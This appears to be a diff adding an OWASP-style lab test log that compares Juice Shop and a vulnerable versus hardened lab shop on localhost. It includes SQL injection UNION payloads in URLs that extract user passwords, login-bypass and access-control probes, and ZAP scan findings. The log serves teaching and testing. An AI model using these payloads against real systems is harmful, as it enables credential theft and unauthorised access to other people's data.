@@ -1,0 +1,56 @@
+
+== A03 Injection: Juice Shop ==
+[401] A03_juice_1_login_normal: POST http://localhost:3000/rest/user/login
+[500] A03_juice_2_login_quote: POST http://localhost:3000/rest/user/login
+[200] A03_juice_3_login_bypass: POST http://localhost:3000/rest/user/login
+  токен после обхода аутентификации получен: True
+[500] A03_juice_4_search_union: GET http://localhost:3000/rest/products/search?q=qwert'))%20UNION%20SELECT%20id,email,password,'4','5','6','7','8','9'%20FROM%20Users--
+
+== A03 Injection: ENU Lab Shop v1 / v2 ==
+[200] A03_lab_v1_1_login_bypass: POST http://localhost:5001/api/login
+[200] A03_lab_v1_2_search_union: GET http://localhost:5001/api/products?q=zzz'%20UNION%20SELECT%20id,username,password,role%20FROM%20users--
+[401] A03_lab_v2_1_login_bypass: POST http://localhost:5002/api/login
+[200] A03_lab_v2_2_search_union: GET http://localhost:5002/api/products?q=zzz'%20UNION%20SELECT%20id,username,password,role%20FROM%20users--
+
+== A01 Broken Access Control: Juice Shop ==
+[201] A01_juice_0_register: POST http://localhost:3000/api/Users
+[200] A01_juice_1_login_user: POST http://localhost:3000/rest/user/login
+[200] A01_juice_2_own_basket: GET http://localhost:3000/rest/basket/6
+[200] A01_juice_3_foreign_basket_1: GET http://localhost:3000/rest/basket/1
+[200] A01_juice_4_foreign_basket_2: GET http://localhost:3000/rest/basket/2
+[200] A01_juice_5_users_list: GET http://localhost:3000/api/Users
+
+== A01 Broken Access Control: ENU Lab Shop v1 / v2 ==
+[200] A01_lab_v1_1_login_aliya: POST http://localhost:5001/api/login
+[200] A01_lab_v1_2_own_profile: GET http://localhost:5001/api/users/2
+[200] A01_lab_v1_3_foreign_profile: GET http://localhost:5001/api/users/3
+[200] A01_lab_v1_4_foreign_order: GET http://localhost:5001/api/orders/2
+[200] A01_lab_v1_5_admin_users: GET http://localhost:5001/api/admin/users
+[200] A01_lab_v2_1_login_aliya: POST http://localhost:5002/api/login
+[200] A01_lab_v2_2_own_profile: GET http://localhost:5002/api/users/2
+[403] A01_lab_v2_3_foreign_profile: GET http://localhost:5002/api/users/3
+[403] A01_lab_v2_4_foreign_order: GET http://localhost:5002/api/orders/2
+[403] A01_lab_v2_5_admin_users: GET http://localhost:5002/api/admin/users
+
+== ZAP spider + active scan: http://localhost:3000 ==
+  High           SQL Injection (CWE-89) — 1 шт.
+  Medium         Content Security Policy (CSP) Header Not Set (CWE-693) — 165 шт.
+  Medium         Cross-Domain Misconfiguration (CWE-264) — 184 шт.
+  Low            Application Error Disclosure (CWE-550) — 7 шт.
+  Informational  Authentication Request Identified (CWE--1) — 5 шт.
+  Informational  Modern Web Application (CWE--1) — 145 шт.
+  Informational  Session Management Response Identified (CWE--1) — 1 шт.
+  Informational  User Agent Fuzzer (CWE-0) — 29 шт.
+
+== ZAP spider + active scan: http://localhost:5001 ==
+  High           SQL Injection (CWE-89) — 2 шт.
+  Low            Application Error Disclosure (CWE-550) — 8 шт.
+  Low            Server Leaks Version Information via "Server" HTTP Response Header Field (CWE-497) — 16 шт.
+  Low            X-Content-Type-Options Header Missing (CWE-693) — 6 шт.
+  Informational  Authentication Request Identified (CWE--1) — 2 шт.
+  Informational  Session Management Response Identified (CWE--1) — 1 шт.
+
+== ZAP spider + active scan: http://localhost:5002 ==
+  Low            Server Leaks Version Information via "Server" HTTP Response Header Field (CWE-497) — 16 шт.
+  Informational  Authentication Request Identified (CWE--1) — 2 шт.
+  Informational  Session Management Response Identified (CWE--1) — 1 шт.
